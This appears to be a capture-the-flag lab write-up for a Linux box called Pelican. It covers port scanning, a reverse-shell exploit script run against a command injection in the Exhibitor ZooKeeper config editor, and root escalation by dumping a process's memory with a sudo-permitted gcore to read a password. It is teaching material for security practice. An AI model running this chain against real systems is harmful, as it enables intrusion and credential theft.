# Pelican

**OS:** Linux **Difficulty:** Intermediate **Date completed:** 2026-05-26 **Tags:** #command-injection #zookeeper-exhibitor #gtfobins #gcore #core-dump

---

## Summary

Pelican is an intermediate Linux box where an exposed Exhibitor UI for ZooKeeper leads to remote code execution via a command injection vulnerability in its config editor. From there, a misconfigured `sudo` permission on `gcore` allows dumping a running process's memory, exposing plaintext root credentials.

---

## Reconnaissance

### Nmap

```bash
nmap -p- -A -T4 192.168.230.98 --open
```

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods:
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.230.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
39605/tcp open  java-rmi    Java RMI
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
```

**Key findings:**

|Port|Service|Version|
|---|---|---|
|22 and 2222|SSH|7.9|
|139/445|SMB||
|631|ipp|CUPS 2.2|
|2181|zookeeper|zookeeper 3.4.6|
|8080|HTTP|Jetty 1.0|
|8081|HTTP|nginx 1.14.2|
|39605|java-rmi|?|

- Port 139/445: check for anonymous SMB login
- Port 8081: redirects to port 8080
- Port 22 and 2222: standard, revisit if credentials are found
- Port 631: default Linux print server (CUPS)
- Port 39605: Java RMI, used for inter-JVM communication

---

## Enumeration

- SMB does not allow anonymous login
- Web app on port 8080 reveals Exhibitor for ZooKeeper
- Google search for exploits lands on [Exihibitor-RCE](https://github.com/thehunt1s0n/Exihibitor-RCE)

<img width="671" height="379" alt="Pelican (Exhibitor page)" src="https://github.com/user-attachments/assets/46e6e106-0439-4ff0-93af-cec7395f6f5d" />


---

## Initial Foothold

There is a command injection vulnerability in the Config editor of the web app. Commands are executed by the Exhibitor process when it launches ZooKeeper.

```bash
git clone https://github.com/thehunt1s0n/Exihibitor-RCE/
cd Exihibitor-RCE/
./exploit.sh <attacker_host> <attacker_port>
```

**Result:** shell as `charles`

---

## Privilege Escalation

```
charles@pelican:/opt/zookeeper$ sudo -l

Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

Searching GTFOBins, `gcore` can read data from local files. It generates core dumps of running processes, which we can filter with `strings` to read sensitive information.

Next, check running processes for anything running as root worth reading:

```
charles@pelican:/opt/zookeeper$ ps aux

...
root       492  0.0  0.0   2276    76 ?        Ss   18:53   0:00 /usr/bin/password-store
...
```

```
charles@pelican:/opt/zookeeper$ sudo /usr/bin/gcore 492

Saved corefile core.492
```

Running `strings` on `core.492` reveals plaintext credentials:

```
charles@pelican:/opt/zookeeper$ strings core.492

/usr/bin/passwor
////////////////
001 Password: root:
[REDACTED]
x86_64
/usr/bin/password-store
```

```
charles@pelican:/opt/zookeeper$ su root

Password:

root@pelican:/opt/zookeeper#
```

**Result:** shell as `root`

---

## Lessons Learned

- Always check unfamiliar services (Exhibitor) for public exploits
- `sudo -l` should be one of the first things checked on any new shell

---

## References

- [Exihibitor-RCE](https://github.com/thehunt1s0n/Exihibitor-RCE)  (exploit used for initial foothold via Exhibitor config command injection)
- [GTFOBins - gcore](https://gtfobins.github.io/gtfobins/gcore/)  (reference for privesc technique using sudo-permitted gcore)
